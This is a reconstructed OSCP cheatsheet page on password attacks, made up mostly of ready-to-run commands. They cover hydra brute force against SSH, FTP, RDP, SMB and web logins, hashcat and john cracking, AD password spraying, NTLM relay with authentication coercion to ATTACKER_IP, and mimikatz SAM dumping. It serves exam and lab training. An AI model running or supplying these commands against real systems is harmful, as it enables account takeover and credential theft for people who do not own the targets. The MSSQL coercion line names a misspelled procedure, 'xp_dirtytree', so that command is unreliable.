---
title: "Password Attacks"
date: 2026-06-20
weight: 50
draft: false
tags: ["oscp", "cheatsheet"]
summary: "Hash cracking, online brute force, AD spraying, relay — every way to break credentials."
---

Hash cracking, online brute force, AD spraying, relay — every way to break credentials in the exam.

- Source: https://heretek.dev/oscp-cheatsheet/password-attacks/ (Jean Romero) — Reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP

## Finding wordlists per protocol

```bash
locate seclists | grep -i ftp
locate seclists | grep -i ssh
```

## Default account brute force

```bash
# FTP
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$TARGET -v -I

# SSH
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://$TARGET -v -I
```

## Passwords containing special characters (: ! etc.)

impacket tools use : as the username:password separator. If the password contains :, impacket misparses it and sends the wrong password — which can lead to account lockout.

Which tools handle special characters:

- evil-winrm — handles them (use single quotes): `evil-winrm -i TARGET -u user -p 'rabbit:)'`
- PowerShell remoting — handles them: use Invoke-Command from inside the domain
- nxc — handles them (use single quotes): `nxc smb TARGET -u user -p 'rabbit:)'`
- impacket-psexec — cannot handle them, : breaks parsing → never use with special-character passwords
- impacket-secretsdump — cannot handle them, same issue → use the `-hashes` flag
- impacket-wmiexec — cannot handle them, same issue → use the `-hashes` flag

Safe alternatives for special-character passwords:

```bash
# Option 1 — evil-winrm with single quotes (safest for special chars)
evil-winrm -i $ip -u user -p 'rabbit:)'

# Option 2 — Pass the hash (no password needed at all)
evil-winrm -i $ip -u user -H <ntlm_hash>

# Option 3 — PowerShell remoting from INSIDE the domain
$pass = ConvertTo-SecureString 'rabbit:)' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $pass)
Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock { whoami }
```

If you lock an account by mistake:

- Domain lockouts usually clear automatically after 15-30 minutes.
- Work on another machine while you wait.
- Do not spray special-character passwords across multiple machines.

## DCC2 / slow hash cracking strategy

Cracking priority:

- Themed wordlist + rules — when usernames suggest a theme (30 seconds)
- Small common lists — xato-net-10-million-passwords-1000.txt, 10k-most-common.txt
- Small common list + rules — same list with -r /usr/share/hashcat/rules/best64.rule
- rockyou — last resort, run in the background while you do other work

Building a themed wordlist in the exam room (no internet needed):

```bash
# Look at usernames — are they themed? (game chars, seasons, cities, etc.)
# Write 10-15 related words:
echo -e "Mushroom\nPrincess\nMario\nLuigi\nBowser\nToad\nPeach\nStar\nKoopa" > themed.txt

# Apply rules — turns 10 words into 700+ variations
hashcat -m 2100 hashes.txt themed.txt -r /usr/share/hashcat/rules/best64.rule --force
# This adds: !, 1, 123, s to S, UPPERCASE, reverse, etc.
```

Themes worth noticing:

- Seasons (summer, winter) → Season + year: Summer2024!
- City names → City + digits: London123
- Company name from the lab → CompanyName1!

- DCC2 cannot be used for pass-the-hash. You must crack it first. Use hashcat mode 2100.

## Hash identification

```bash
hashid -m '<HASH>'    # identifies hash type + hashcat mode
```

## Hashcat modes to memorize (exam staples)

- 1000: NTLM — SAM dump, secretsdump, mimikatz
- 5600: NetNTLMv2 — Responder capture
- 13100: Kerberoast (RC4) — GetUserSPNs, Rubeus
- 18200: AS-REP Roast — GetNPUsers, Rubeus
- 1800: sha512crypt ($6$) — Linux /etc/shadow
- 500: md5crypt ($1$) — Linux /etc/shadow (older)
- 3200: bcrypt ($2a$) — web applications
- 0: MD5 — web app databases
- 1700: SHA-512 — miscellaneous
- 400: WordPress ($P$) — wp_users table
- 2100: DCC2 (cached domain creds) — cached entries from secretsdump

## Standard cracking commands

```bash
hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# If rockyou doesn't crack it, try with more rules:
hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule --force

# View previously cracked results:
hashcat -m <MODE> hash.txt --show
john hash.txt --show
```

## Extracting hashes from files (*2john family)

Every password-protected file converts into a crackable hash. If someone protected it, the contents matter — crack it.

- Important: hashcat cannot read raw files (id_rsa, .zip, .pdf, .kdbx). You must extract the hash with *2john first. Feeding a raw file to hashcat produces a "Separator unmatched" error. For file-based hashes john is simpler — one extraction + one crack. Use john instead of hashcat.

```bash
# Password cracking
pdf2john .pdf | tee pdf_hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash

pdf2john file.pdf > hash.txt && john hash.txt --wordlist=rockyou.txt
ssh2john id_rsa > hash.txt && john hash.txt --wordlist=rockyou.txt
zip2john file.zip > hash.txt && john hash.txt --wordlist=rockyou.txt
keepass2john file.kdbx > hash.txt && john hash.txt --wordlist=rockyou.txt
rar2john file.rar > hash.txt && john hash.txt --wordlist=rockyou.txt
office2john file.docx > hash.txt && john hash.txt --wordlist=rockyou.txt
```

## Online brute force

```bash
# SSH
hydra -l admin -P rockyou.txt ssh://TARGET -t 4
hydra -l admin -P rockyou.txt -s 2222 ssh://TARGET    # non-standard port

# FTP
hydra -l admin -P rockyou.txt ftp://TARGET -t 4

# RDP (password spray: one password, many users)
hydra -L users.txt -p 'CompanyPass2024!' rdp://TARGET

# SMB
hydra -l admin -P rockyou.txt smb://TARGET
```

### Hydra HTTP POST form (web login brute force)

The trickiest case. Capture the login request in Burp first to extract the exact parameters.

```bash
# Syntax: hydra TARGET http-post-form "PATH:BODY:FAIL_STRING"
# PATH = the form action URL
# BODY = POST parameters with ^USER^ and ^PASS^ placeholders
# FAIL_STRING = text that appears on FAILED login (tells hydra which attempts failed)

# Example: TinyFileManager login
hydra $TARGET http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed" -l admin -P rockyou.txt

# Example: WordPress wp-login.php
hydra TARGET http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect" -l admin -P rockyou.txt

# Example: generic form
hydra TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -l admin -P rockyou.txt
```

How to find the right values:

- Intercept the login request in Burp Suite.
- PATH = the URL path the form POSTs to (from the POST /path line)
- BODY = the raw POST body with username/password replaced by ^USER^/^PASS^
- FAIL_STRING = unique text from the failure response (check the Burp response)

- If an authentication attack is still running after 3 minutes, recheck the command. If it takes that long, the syntax is probably wrong.

## Creating custom wordlists

```bash
# Scrape website for words
cewl http://TARGET -w custom.txt -d 3

# Mutate wordlist with rules
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt

# Combine
cat custom.txt rockyou.txt > combined.txt
```

### hashcat custom rules (matching a password policy)

If the target has a password policy (e.g. uppercase + digits + special), mutate the wordlist to match it:

```bash
# Common rule functions (one per line in a .rule file)
# c = capitalize first letter, $1 = append "1", $! = append "!"
echo 'c$1$!' > custom.rule
# Applies: password → Password1!

# Two rules on separate lines = each applied independently (doubles output)
echo -e 'c$1$!\nc$2$@' > custom.rule
# Applies: password → Password1! AND Password2@

# Apply rules during cracking
hashcat -m <MODE> hash.txt wordlist.txt -r custom.rule

# Preview mutations without cracking (debug)
hashcat --stdout wordlist.txt -r custom.rule | head -20
```

Rule combinations common in corporate policies:

- Uppercase + digits + special: `c$1$!` → Password1!
- Uppercase + year: `c$2$0$2$4` → Password2024
- Uppercase + season pattern: apply `c` to seasons.txt → Spring, Winter
- Prefix a digit: `^1` → 1password

Built-in rules: best64.rule (fast, decent coverage), dive.rule (thorough, slow), rockyou-30000.rule (large scale)

## AD password spraying

Always check the lockout policy first:

```bash
netexec smb <DC_IP> -u 'USER' -p 'PASS' --pass-pol
```

Spray one password at a time, with an observation window between attempts:

```bash
netexec smb <DC_IP> -u users.txt -p 'CompanyName2024!' --continue-on-success --no-bruteforce
netexec smb <DC_IP> -u users.txt -p 'Password123!' --continue-on-success --no-bruteforce
kerbrute passwordspray -d DOMAIN --dc <DC_IP> users.txt 'Season+Year!'
```

Common spray passwords: Season+Year! (Spring2024!), CompanyName+Year!, Password123!, Welcome1!

## Net-NTLMv2 relay (when you cannot crack the hash)

If you capture a Net-NTLMv2 hash but fail to crack it, relay it to another machine where that user is a local admin.

- Prerequisite: SMB signing must be disabled on the relay target.

```bash
# Check SMB signing across the network
netexec smb <SUBNET>/24 --gen-relay-list targets.txt
# targets.txt = machines with SMB signing disabled

# Start relay (forward auth to a target, get shell)
impacket-ntlmrelayx -tf targets.txt -smb2support
# Default: dumps SAM hashes. Add -i for interactive shell, -c for command execution.
impacket-ntlmrelayx -tf targets.txt -smb2support -i   # interactive SMB shell on 127.0.0.1:11000
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
```

Ways to trigger authentication:

- Web app UNC path — set //ATTACKER_IP/fake in a plugin/feature with a file path field
- PetitPotam: `python3 PetitPotam.py ATTACKER_IP TARGET_IP`
- PrinterBug: `python3 dementor.py ATTACKER_IP TARGET_IP`
- xp_dirtytree (MSSQL): `EXEC master..xp_dirtytree '\\ATTACKER_IP\share'`

- Relay ≠ PtH. Relay forwards a live authentication attempt. PtH uses a stolen hash directly.

## mimikatz from a non-SYSTEM admin shell

When you are admin but not SYSTEM (e.g. RDP as a local admin), you need token::elevate before dumping SAM:

```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate        :: impersonate SYSTEM token
mimikatz # lsadump::sam           :: now works — dumps local account hashes
```

- Without token::elevate, lsadump::sam fails with access denied in a medium-integrity admin shell.
